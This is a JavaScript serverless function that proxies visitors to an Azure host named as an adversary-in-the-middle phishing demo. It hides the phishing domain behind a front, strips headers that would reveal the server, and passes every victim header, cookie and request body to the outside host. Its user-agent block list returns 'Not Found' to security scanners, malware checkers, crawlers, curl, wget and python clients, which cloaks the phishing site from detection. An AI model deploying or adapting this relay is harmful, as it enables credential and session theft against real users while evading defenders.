// Vercel API function to proxy Azure Function
// This masks the domain and adds security headers

export default async function handler(req, res) {
  const targetUrl = 'https://azureaitm-phishing-demo-1755253259.azurewebsites.net'
  
  // Bot detection
  const userAgent = req.headers['user-agent'] || ''
  const botPatterns = [
    'bot', 'crawler', 'spider', 'scraper', 'scanner',
    'security', 'malware', 'virus', 'threat',
    'curl', 'wget', 'python', 'java', 'go-http-client'
  ]
  
  const isBot = botPatterns.some(pattern => userAgent.toLowerCase().includes(pattern))
  
  if (isBot) {
    return res.status(404).json({ error: 'Not Found' })
  }
  
  // Build target URL with proper path and query
  const url = new URL(req.url, `https://${req.headers.host}`)
  const targetUrlObj = new URL(targetUrl)
  
  // Preserve the exact path and query string
  targetUrlObj.pathname = url.pathname
  targetUrlObj.search = url.search
  
  // Prepare headers - forward all original headers
  const headers = {}
  
  // Copy all headers from the original request
  Object.keys(req.headers).forEach(key => {
    if (key.toLowerCase() !== 'host' && 
        key.toLowerCase() !== 'x-forwarded-host' && 
        key.toLowerCase() !== 'x-vercel-deployment-url') {
      headers[key] = req.headers[key]
    }
  })
  
  // Add required headers for proper forwarding
  headers['host'] = 'azureaitm-phishing-demo-1755253259.azurewebsites.net'
  headers['x-forwarded-for'] = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress
  headers['x-forwarded-proto'] = req.headers['x-forwarded-proto'] || 'https'
  
  try {
    // Prepare request body
    let body = undefined
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      if (req.headers['content-type'] && req.headers['content-type'].includes('application/json')) {
        body = JSON.stringify(req.body)
      } else {
        body = req.body
      }
    }
    
    // Make request to Azure Function
    const response = await fetch(targetUrlObj.toString(), {
      method: req.method,
      headers: headers,
      body: body
    })
    
    // Get response body
    const responseBody = await response.text()
    
    // Set response headers
    const responseHeaders = {}
    
    // Copy all response headers
    response.headers.forEach((value, key) => {
      // Remove revealing headers
      if (key.toLowerCase() !== 'server' && 
          key.toLowerCase() !== 'x-powered-by' && 
          key.toLowerCase() !== 'x-aspnet-version') {
        responseHeaders[key] = value
      }
    })
    
    // Add security headers
    responseHeaders['x-frame-options'] = 'SAMEORIGIN'
    responseHeaders['x-content-type-options'] = 'nosniff'
    responseHeaders['referrer-policy'] = 'strict-origin-when-cross-origin'
    responseHeaders['x-xss-protection'] = '1; mode=block'
    
    // Set all headers
    Object.entries(responseHeaders).forEach(([key, value]) => {
      res.setHeader(key, value)
    })
    
    // Send response with correct status
    res.status(response.status).send(responseBody)
    
  } catch (error) {
    console.error('Proxy error:', error)
    res.status(503).json({ error: 'Service temporarily unavailable' })
  }
}
